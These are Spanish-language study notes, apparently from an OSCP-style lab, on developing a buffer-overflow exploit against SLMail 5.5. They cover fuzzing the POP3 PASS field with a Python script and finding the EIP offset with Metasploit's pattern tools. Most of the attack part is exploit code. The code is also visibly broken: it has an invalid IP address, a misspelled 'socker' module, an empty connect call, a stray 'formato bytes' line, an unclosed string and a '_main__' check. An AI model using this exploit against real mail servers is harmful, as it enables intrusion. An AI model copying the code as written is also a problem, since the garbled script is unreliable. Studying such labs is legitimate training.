> En esta fase detectamos el servicio defectuoso y la cantidad de basura a inyectar hasta poder inyectar lo que realmente queremos.

### Preparacion
- Como la maquina virtual tiene SLMail 5.5 tiene un bufferoverflow
- Desde Inmunity Debugger
`file -> attach -> slmail`
- Hay que darle a play
- Buscar `searchpploit slmail 5.5`
- Leer el codigo `searchsploit -x ruta` y analizar el codigo

### Codigo para inyectar
```python
#!usr/bin/python3

import socket, sys

ip_address = "192.168.1000.1"
port = 110
total_length = int(sys.argv[1])

print(total_length)

if len(sys.argv) != 2:
	print("\n[!] Usage: exploit.py <length>)
	exit(1)

def exploit():
	s = socket.socket(socket.AF_INET, socker.SOCK_STREAM)
	s.connect(())
	banner = s.recv(1024)
	print(banner)
	
	s.send(B"USER savitar"+b'\r\n')
	formato bytes
	response = s.recv(1024)
	print(response)
	
	s.send(b"PASS " + b'A'*total_length + b'\r\n')
	s.close()

if __name__ == '_main__':
	exploit()
```

- Ejecutar: `python3 exploit.py 1500`
- Se pauso el inmunity debugger que estaba viendo el programa slmail
- Preguntarnos, cuantas A tenemos que escribir para que ocurra el bufferoverflow?

### Encontrando el offset
- Usamos un script ya hecho para crear un patron apra encontrar el offset en base a la salida: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000`
- Le envio toda esa cadena que me genera el programa de metasploit
- Cerrar todo y volver a abrir el slmail -> control start
- Copiar el valor en EIP y ahora se lo pasa al `pattern_offset.rb -q valor_eip`
- Cambiamos el codigo, colocando variables
```python
offset = 4654
before_eip = b"A"*offset
eip = b"42"*4

payload = before_eip + eip
```

- De esa forma descubrimos el offset y lo que sigue es ver una vez que desbordamos ese buffer EIP hacia donde se redirigen los proximos bits.